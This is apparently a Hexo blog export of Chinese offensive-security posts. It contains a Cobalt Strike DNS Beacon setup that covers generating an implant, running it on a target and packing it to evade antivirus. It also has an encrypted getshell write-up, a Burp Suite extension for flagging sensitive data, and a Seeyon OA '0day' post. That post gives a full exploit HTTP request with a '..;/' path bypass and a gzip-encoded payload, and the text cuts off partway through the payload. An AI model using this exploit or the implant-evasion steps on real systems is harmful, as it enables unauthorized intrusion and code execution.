<p><a href="https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ</a></p>
<p><a href="https://docs.python.org/zh-cn/dev/library/pickle.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/dev/library/pickle.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/148696337" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/148696337</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike Beacon DNS上线</title>
    <url>/2020/12/02/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>因为最近捣鼓了一下Cobaltstrike DNS上线，发现网上文章大多数千篇一律(复制粘贴)，形成很多误导。</p>
<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">域名平台：阿里云</span><br><span class="line">CobaltStrike版本：<span class="number">4.1</span></span><br></pre></td></tr></table></figure>

<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><h5 id="域名配置"><a href="#域名配置" class="headerlink" title="域名配置"></a>域名配置</h5><a id="more"></a>

<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">添加一条<span class="keyword">A</span>记录指向服务端地址，然后添加两条（可一条）<span class="keyword">NS</span>记录指向<span class="keyword">A</span>记录</span><br></pre></td></tr></table></figure>

<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201125358965.png" alt="image-20201201125358965"></p>
<h5 id="Listener-配置"><a href="#Listener-配置" class="headerlink" title="Listener 配置"></a>Listener 配置</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Name: 自定义</span><br><span class="line">Payload: Beacon DNS</span><br><span class="line">DNS Hosts: 域名的NS记录(一个以上)</span><br><span class="line">DNS Hosts(Stager):<span class="built_in"> DNS </span>Hosts的中的一个（只有一个的情况就写一样的）</span><br><span class="line">DNS Port(Bind): 空</span><br></pre></td></tr></table></figure>

<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201144725118.png" alt="image-20201201144725118"></p>
<h5 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nslookup ns记录</span><br><span class="line">默认情况下看是否返回<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>，返回则表示成功。（可通过profile来更改的，其进行流量隐藏等，具体可见参考）</span><br></pre></td></tr></table></figure>

<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201130948405.png" alt="image-20201201130948405"></p>
<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>这里生成一种进行演示，可自行尝试其他方式。</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201132840569.png" alt="image-20201201132840569"></p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201133135684.png" alt="image-20201201133135684"></p>
<h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><p>目标靶机执行生成的木马文件</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201133647578.png" alt="image-20201201133647578"></p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">出现小黑电脑右键-&gt;Interact</span><br><span class="line">输入命令</span><br><span class="line">checkin #强制回连</span><br><span class="line">注：很多文章需输入mode dns-txt （默认就为dns-txt模式）</span><br><span class="line">根据官方文档描述，CS4中有三种数据传输模式，<span class="keyword">A</span>、<span class="keyword">AAAA</span>、<span class="keyword">TXT</span>，默认是<span class="keyword">TXT</span></span><br></pre></td></tr></table></figure>

<p>显示蓝色电脑如图则成功上线</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201133927679.png" alt="image-20201201133927679"></p>
<p>执行whoami</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201135019135.png" alt="image-20201201135019135"></p>
<h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><p>这里演示一下加壳免杀过某绒。</p>
<p>免杀前，生成的文件直接给某绒自动处理了。</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201143243313.png" alt="image-20201201143243313"></p>
<p>进行VMP加壳处理</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201143432147.png" alt="image-20201201143432147"></p>
<p>进行检测</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201144944327.png" alt="image-20201201144944327"></p>
<p>测试</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201154931556.png" alt="image-20201201154931556"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/7938" target="_blank" rel="noopener">https://xz.aliyun.com/t/7938</a></p>
<p><a href="https://www.nctry.com/1655.html" target="_blank" rel="noopener">https://www.nctry.com/1655.html</a></p>
<p><a href="https://choge.top/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">https://choge.top/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/</a></p>
]]></content>
      <tags>
        <tag>Cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>某SRC任意文件包含漏洞 包含日志Getshell</title>
    <url>/2020/10/20/%E6%9F%90SRC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97Getshell/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已加密, 请输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c81eda7ff55877f1cad0bf7df46f730520ee4ac93067774dc51d8bdc27d071be">ee630012bddc00c61ef0585c52f9079d7a967d5982e5276e29c833b46e079e922c8a03b936ebbfb0745aade7bf3b83d5984745f1ff276676a63392e01c61d23a2237cde55072fd2d70f0a2d771f75a7088f2f2e600fddc0f7b381bf0931f4a206dc7933ec66fdb4217f6ecf50176bed6abf59f119d727c0864de1aa59a53edac804ad8521115615c1770b3452d3f0cfc3b17193dd2b3593c3b0d02cadb44eb74edba3c4edbe16a113e4d1441cc49a274b6542f668986e7479afb59127faf9a699aeb08fe60525d3ca6cbf2ab7ef35c8e7f9e98e1bc6ddcf08523e560881f74a58bfbfb3d66c98e2f129f9036e94b9450bbc84d390069a9665058648337c9617cf908d362cfbe631b1a5672417583d31f25e3ca4c867853928f1b593a1936050e55fec5a0bc7579424a42b008c354590cd5fc39d78ff5f18ec2df264e28be302afd68572e2b56d867d618a6e2a8b01d4adb7d9f90df06fb230eb7310aed06be73995b156fe4b5ed892df823f258b9904148b9453f53c8241f9b336787df49293e0dd261b194d777b018eb0f0c5ad41984495dd89e7f41a16f58a8b36e78f23f775855f8ca55f5db947902a20badbe8bfc2aedf9ea07090639aee7d969abdc6a90e38d10740162b219cb893c095b6b338dc604a64f1d7d75bc44567887317ecf8cf2e4ecf5280a8d0ea68f4066523d6a376ad6ff93d327ab8de0b2d9b06f84ea515da9edfb8312c8ff3356134a90f1909737ca191da28cd3ceda7c4b156e4bd3a2ba541d1c42d31d01015c5fdc5208a5ed56ad7dda3bf8928d8c7b4f9dad0085568435c92a28f0c701ce1778876b5d1aa89d829b74d156cdad26a38df57ea024de8ed59c175370203457a7933c5e92b02b21a4e054e255f7a4d5aad5290831db1d11dab6376ef730aa56ccb141cf1237fd7d702c03e97a06fcf3249a94c5c65339dc4d2b8985e16fb44acff88edf442f3b05833191456c95bcbd81b881f027609129650fc372e198ece31bc501de7717a115cefb3384fa39c0e24e6dc75b1a42754913eb5ed93f60dcd501d1eeeb5b98b546c75ae14dce97008c9efdb1f66fb429571123cc9e1ad1f7624046d6ac644ec802a31f89520d18c1f6bfcfe234f4051e6fa613ddb18287e1e6b98916e170836c3d3af59ad6ed0bc060876d7e92b2b361b73a06b77743090daeda9986bdd55586172d7cedde204ec8fde80e24ed54511d8750d77ce972031aed343e9c797000b1077197fc089b3108e69b190eec78ddec6c0f9df621a493503c08de04272f1e5fd5a24125827996de92d7dd99c0f391667b54b9083c1cee0bcc8448c94c43f3d38bd3a9ad702290ffca408bde62fc05052b5e10cb23a8a6c7b9625cb67c2d25550f05dc945ecc47f49703c23ddaa153bf93e25a69f8588cbb9836fe179f95171dd19fd62edb80cee91f5f3f9f32b048ed16e0af944a56af9a8e4f884bb674c4f41e8918de8084de6b76baa09dbfa3d435f44eef5307dc5077ad13290e2c81b8165d3adaa046fa20dca3966ef902472dfdc8f3effd82fe83259de487bb9ed4fb02f22763af8bdfa6fc972af93f1fef7625df86c03da0e07e501ecfe0ad81e4893506513869fd627d105f2ea89cb2de6f881dd3a542f3edd04c53db5fbc24a5b02a3e38bea3c95df44168211303fd212f86c6c5d937d5d21dcc45e274f7bd89b3c393882649166bb85234cea6b727cf045286781feeaae13d214fce71b4dcc51d0bb49302d5a2122c51eb5836c7b1dddb25c2bda06c07729a1d3c9f65961e3d27ccf0c3bd86276637c6c6fc2dc483f5ada9861b433c000f6edf3280cc0b547a7b52f2db47019a7dfbdc33be0ff7415915c7766ea13f7a9d1a9a46eb9a94df289fee5c4191ca95b63aa04246093b55289e454ccf9db74e365b6313e5b5234d5d0f31fe85c5354d8f2b71f7957ac2c3ef53e1bc620b3ca0e168ed2e7cc2c8b883ca4b227aa3fd38a33b5467f107cb078e21147a9cce2646173cfe2b1e49302d7abc369fe72195d5082c6a2a5fa6a4870328e9147459264754b23ddba7195d5b8d33e706553fa53a38bc59a713c79728232129c7fd0aa62a48bb004034aa7f62bef1615c87f3e515d1e6f94c3edb0acd4a9a0d1b54f91c5ede5d9c379494c942f93259699ae80f005c27e409ceea57683490ba97d38ab90c946cac360b2e2059a4b89e66cec106b6acb369c8bb1b3c4f22e137f17fde1e87ae8791b66d981652129a712e60eee35f8981a9f082f4b27a70df8271c20e6b15919f483c99cd3f0b021926345c0656c5e74d71074423046211b6bb9b04c879633a0367e312242d60ee6ccd3f4d08e36ca16900828bdbe2c5a62e9be1ba7f12294e5903b83928e26d48d09958354982b862c7f8103e628bb9639d46c979d3c02bec70531e11f9c1058ea8d408e53ff125774b45e2e65c74f247783f3785915b5b893590734f22b2b1ad400407c3f5090649725eb27fb7b365a802b4d8ae31a251940201541afe8630db8d1e4fbfb46b42fb7f04cb2be0974aacbc7cd5ddd1490b7fb1c0f34c2b8a5656e90cceaa1ea8b4ab40c4a3531a7bf72f12f7b9e4c42e21c99e02ffa72a7a3842a62f5adf954dd5f29ec516c09874a3d6acc1293c99475fe8cf73d38b6c973fd3b077eca153fa946d3f1aed0392815a048986533802626f646b0d3955c29a84a2c1693b90889ddc4b45ac9b28b0360618a85b4aecfc6b0c071a1c4e708f565de3d3a44491d069933e67a4417dd6e6c20b361789200da5685b46b49cdf7cb43aee13ddaa33d68671e5c8d3a87c29a0374e65ee1a8eaa2d00ed942e17ccb96503c575ca5a6441590833bc589822296c47237edf952486e1276c35739f8d733419829b49aea08a374754c8c24fc619671f99e2d262fd2f6a2d4d7330a77747c2415d5f416335afc8a4975fea38737960c94c99c0a6c9be5d28783aab600787357ee4f35fed7ca4a388b9112dafb98a73b90665bddab16a464b2b21955830cd5c2b7b840711a25531d0a8415a2d56b444d4307992a11c9ba3ec2843a9d3170b1fab1a90dd62c3db7e700907e4e7bd2feb914593ca4038bf280efae407fa27d0820752f6a76312b1f4d98133a3cd5010b15c36e6df366fed2afd933ea4d750eab9e347172d581c8a7a847686d09038c4c5008476b3b19c5bbc39fd43eda8f35d7b99a8f2405a88fd7379c5fb60efc9ffb113bfcd1bce43fe9cf5ce94f85e48966ba506a27fccf8277413e2176e4532f93bf47d85846a5c77cb530ae1cda33775aa5f7f350ed542b9f93c058b24d10da6a048d961d9f8583fc701517b81dcc26c8d866930ccbee470a48c2ca236461226c5a3a1522c65bdd63507bb11d9e8418f477d254e0f79ee747418f8287297bb5fc0128b233d152b4dfc7186f5d31042b3161e1dca5c3c7af16be2d9ce7057ab0f9ba907a9d74e5fb2df86bcf6257219b63454fd57051a567639dc6d52a9e1a42ae5b74d29a51475e59c73d6fd3a1604e079a31d9d32c64d96c61d4858ad5e4e88f31d86ea7be021ed2360fba52470d13cf047d32de8479cdac56e1f896705aa6ea4b45be4d412144d5f7052a82dc3567798c7af7f305764e35b6415b89cee6ed4ceb7d2b171a984b47c1a313ac66d069d05111fcdd2b97c904a3334010b84b07eae9169cf3cf2157991463c98f438c2a0369132ae11287afa3ade566e9bfc8098163c096196606ad3c343f868139705920eec38ac3869f6911bc37353e7761dbc61f50c7e8e0ca6ee2f4c30222bc9e9847c115d2c06aaec95a2407bc18845a51f4ea81ea46acd48f0c34b614e0b09bf018ccd58e5d5008fe27e771e4bec9a6ff6f2b1924e5ba573db3594c66aaf7ae3d090f58c5634f25e497d5ee3f9a73e3724b7c907b376e2464886ef9bf6fa84b6e7b1d7893db8640b1b8957732b2179bef1c846c6ba8a5991fc7a7ccc3e4ef4d54c6cc40dc6ddbdcc4796fcfb73a64d07d931eb068dce6e6f82071b9c31ae95ead9a9bdb1f456a37d4467925a85282c17c94b02773e56c53461c0ada9a2131c1fecd126d689383f181c4f2b366878c5eabdeb751b5ff89c21937378161f0331e1133a782894662d5f9bf4252fa362fafad6d3ea399bcd4a4a9118d243b0876064c29fc865f2f9fd70ef5b78bdad6cb29e1cfdb03c113e44e12c2ee79eb13cda4564cab851def6de16605c9119f97acc6c7243651dc073db0a1be90df698a895c960d50ca7d28b80efbb627caa137a6902715bf3e0f3a1ff72849d45c419c9f76228cf1aa963d33317037da97097245ac9a2963e2b9f25354d6614ce815dbb0309536398dc5eb544845be110fe57f778f56c46a3e81bcd40eacf04a0bb36d5f5744800f0e8deb7026ba5c03e1ba24dfba8a5a57d11ef95a613e37e861426e5b02da3a03277e11b19bc217bbedf73f1d4a8e8d49f0013e3dfaf58250e5f7151d26b9e8e161ae2537a3d2e235ad59787c2adcbddd6bf494af28606ea29f1788ecb183fd66ebf305449514093650e18a872ea8bb81818678782d7483adf978fa033f69f3817407dcd50a2ae5cf506bbb50f375eadda2a921988a8ad2396675f6f473e2fbc3b95f96f91aa91a0d693e6f4ea77348537b7cd25a4f5c4b6bb9d015b28d64100348b1ae523cf8529ae0213d9dd02cdb38fa07b5f2daf1c0bc1031d762b4a4196f59637cc5e4ae9f305760ad856d8492f84f4263eeb636f5967130dd760f38d962a8054ecdf80c6ed9a11a8d3c4ae7204e86351e0f3c0e14d9a092822098cc35b12f88594d765e0e3724a2c34114cff914f9a65998510188019766e1fbc85e0eab4916dadad53533736332cf2a653a61cd9242f0bd245d0f6084b45171100d44a8c67773f690271b29ed51ed38cc89ca03e7e95de144433c8883cdf1f1b6f66890a0f5dacc48da4b03e3fa149071a37e5e483cc735ce15b32a9271f6cc869c8cdec5779bd96df97bedbfc5c8d6c494e670af6cde569ce36da5dc1f68aff873424d89fbf6f5c84302004e5295cd88ff3c593377ca4fd2af31d6615502a792c93ca4a2118933d55c7ba4c6e74edb60853f1cdcd41aee0504db299136ea425e5bedbe1213e0856635856bcd999fd326d4f48e231d18d32164a78ab3045c376a678df948a35e8ecbd6b7bea128386fca1f8f60dbcd7f4faa9316d1ca542aed46d063767cca24dd1621b2b467f393fbaeda4d655ba2c16ea1756624ca270aa801145cd684b0004c2ede5f2855980ec65ac4d5e8e94c53ec0cee377ac2cbbe147f0a3f3e93988f79bf79840831db4b48be3da30865880774028f30afe2437e526b8475c5d8820043aaaa0baa3f333d591a00d84ee8526efc25f18568bf837dfc6dbdf1ed7f1746ea1f1d3f88b6427212ba5f885d42a53a8b4d350cfdfae7bd228aaaed85526fbfec7eaa46424e9b0f152e621ce3d915a8b06b1357a4462222c28f70418b0677af516384be2ecf12117b086f79f91bf03ef37576da1d3569de5b5818add037d63e59b48655f9987efe7519afb56494910e3702d5d5c2264f2ce17b3252086bbe5d6dc6a833ca13bc4729b1235707f372628ea90d680c4c731409c447ae4393af3ec342928b53412f7fe0667a0d19e1bf0ba4850f028e500efe6d0fe0e976e2e3ffd72b3e304e6975349b93523c681ab2de58dc6b14f22a8602c8af451375119d950beb1d708abdc7e129b6686e43e8bcd369ed053e02f592473b7d28aa17d74574231e4bbc612311f453d75cc19341912fa63531e71417eecc53383521cba46b972e5409e0320ba6ba65a06d52f9c901c1298381f9867273dc5eb5bc989cdbd56c28f5540db293934d781084bd95027c099f8b49e622db141fc6b331f3e6dd7f5bc8e3ac1dc1131a532bd9a5fb8d18bb37f2394d6120158175e999f086508e423263b264d290064842589c4791f2cd00a4234e8dae8425a00143c1b337dbb8407e820aa83fdf7be923b1d9da56064b52f663827a83fdfae290c45a7819b5d2392c14a52db737452976de888a073626e91cd5e0affb5f7d6ac994a6af5eb1f1cedafac50e74ed315a7a9f27d45c1cec94becc8af75c1b3ea2574f94ffd9dd7a9083698e292a4ad928a227081b31a3fa44420007062731dace185d24e09aad9a98381855325a88447b8e14fe068014723d4523b3c6edfccdf9a43db9ce93f0cd140b6cb0f0dee6747f1325c4d877b995da6fd4b1d58d61be44da164a7134c4fce122b78a13524125ae3841f2d7a2eec3734d393c490a4cfdd8f82145664d312ec3d71fe2e66d8b1f02c3c1fdb9992cdb465dc06b1cb8c99e60dbdce7eca0eb350e2d40517175880cfb91c1fa5c61835cd948ad12e550e828d132f116baabcb7d26b24db7b190bdd1f99bf3ae3a38e2169f26a2cf53096c59225e17cee5a8d967b6d270b0f5b87db0d9836e151636cca0e32c3e1e3fd6a5ab9ee10d9f5223c9a445b236685d644bf8d829153b121573a8e9831f30baf7e15b8896ef6d0ea666ff87e002e6e9edf26c8764cb87afc271166e87a1c395cdb4114f6332a4deaa0e1f78ef16a8a3caca4ffea4b6d71c1996191d23da130703f93f502a452e783eaced11d1762e5cfbb2aecd3bc307c6c9a8132b2b323dea3a655fe2da7db919c8fa411ea44adcdb8d409da0e6d4a14cfd6b99e4806</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>ThinkCMF</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite-Extender-Unexpected information</title>
    <url>/2020/09/28/Unexpected_information_BurpSuite_Extensions/</url>
    <content><![CDATA[<p>最近写了一个BurpSuite Extensions用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，我将它命名为“Unexpected information”，使用它可能会有意外的收获信息。</p>
<a id="more"></a>

<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><h5 id="支持列表"><a href="#支持列表" class="headerlink" title="支持列表"></a>支持列表</h5><ul>
<li><input checked="" disabled="" type="checkbox"> 身份证信息</li>
<li><input checked="" disabled="" type="checkbox"> 手机号信息</li>
<li><input checked="" disabled="" type="checkbox"> IP信息</li>
<li><input checked="" disabled="" type="checkbox"> 邮箱信息</li>
<li><input checked="" disabled="" type="checkbox"> JS文件API接口路径</li>
<li><input checked="" disabled="" type="checkbox"> 特殊字段(password、method: “post”…)</li>
<li><input checked="" disabled="" type="checkbox"> 双向检测</li>
<li><input checked="" disabled="" type="checkbox"> 高亮显示</li>
</ul>
<h5 id="高亮模式"><a href="#高亮模式" class="headerlink" title="高亮模式"></a>高亮模式</h5><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">邮箱 -&gt; 黄色</span><br><span class="line">内网IP -&gt; 红色</span><br><span class="line">手机号码 -&gt; 绿色</span><br><span class="line">身份证号码 -&gt; 绿色</span><br><span class="line">其他 -&gt; 无 (只开启Unexpected information标签页)</span><br></pre></td></tr></table></figure>

<p>当如数据包中存在有相关的对应信息(如手机号码、IP地址、邮箱、身份证号码等)存在时HTTP history标签页中的对应请求中自动标记颜色高亮，并且开启一个新的标签页名为”Unexpected information”显示匹配到的信息。</p>
<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BurpSuite </span>&gt;&gt; <span class="keyword">Extender </span>&gt;&gt; <span class="keyword">Extensions </span>&gt;&gt; <span class="keyword">Add </span>&gt;&gt; <span class="keyword">Extension </span>type: <span class="keyword">Java </span>&gt;&gt; Select file ...&gt;&gt; 选择对应的插件(Unexpected information.<span class="keyword">jar)</span></span><br><span class="line"><span class="keyword">注意：避免使用中文目录</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ScriptKid-Beta/Unexpected_information/master/image-20200913144353237.png" alt="image-20200913144353237"></p>
<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="https://raw.githubusercontent.com/ScriptKid-Beta/Unexpected_information/master/image-20200913151710096.png" alt="image-20200913151710096"></p>
<p><img src="https://raw.githubusercontent.com/ScriptKid-Beta/Unexpected_information/master/image-20200913152201413.png" alt="image-20200913152201413"></p>
<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>Unexpected_information</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> jar文件</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>Unexpected_information<span class="regexp">/releases</span></span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>欢迎师傅Star，最重要的是如果师傅们有什么建议或者Bug，请在issues里提出来或者公众号留言。</p>
]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>致远OA_0day(捕捉)</title>
    <url>/2020/09/28/%E8%87%B4%E8%BF%9COA_0day(%E6%8D%95%E6%8D%89)/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span> <span class="keyword">contains</span> <span class="string">"..;/"</span></span><br><span class="line"><span class="keyword">http</span>.request.uri == <span class="string">"/seeyon/SeeyonUpdate1.jspx"</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: </span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%2